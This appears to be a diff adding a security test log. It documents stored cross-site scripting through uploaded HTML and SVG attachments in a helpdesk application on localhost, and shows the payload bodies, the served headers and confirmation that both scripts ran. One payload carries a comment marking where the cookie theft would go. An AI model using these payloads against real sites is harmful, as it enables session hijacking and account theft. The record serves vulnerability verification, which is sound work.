@@ -1,0 +1,22 @@
+###### Part B2: active documents served inline ######
+>>> notice.html served as:
+HTTP/1.1 200 OK
+Content-Type: text/html
+>>> notice.html body:
+<script>document.title = "xss-by-upload"; /* exfil document.cookie here */</script>
+>>> logo.svg served as:
+HTTP/1.1 200 OK
+Content-Type: image/svg+xml
+>>> logo.svg body:
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+
+URLS:
+notice.html: http://127.0.0.1:5055/media/helpdesk/attachments/support-10-a8ec41d1-420c-4b4b-929c-900fc7630cff/7/notice.html
+logo.svg:    http://127.0.0.1:5055/media/helpdesk/attachments/support-11-a2e37689-73f9-4c04-8195-5a7029b68e30/8/logo.svg
+
+--- Browser execution confirmed ---
+notice.html (worksheet payload): document.title became "xss-by-upload" (read via JS), origin http://127.0.0.1:5055, Content-Type text/html -> script ran in the app's own origin.
+logo.svg  (worksheet payload): alert(document.domain) fired (auto-dismissed by automation), Content-Type image/svg+xml.
+Visible-proof versions (same vuln, visible output) captured as screenshots:
+  B2_notice_html_xss.jpg  -> "XSS via uploaded notice.html", domain 127.0.0.1, can read document.cookie
+  B2_logo_svg_xss.jpg     -> "SVG <script> executed in this origin: domain=127.0.0.1"
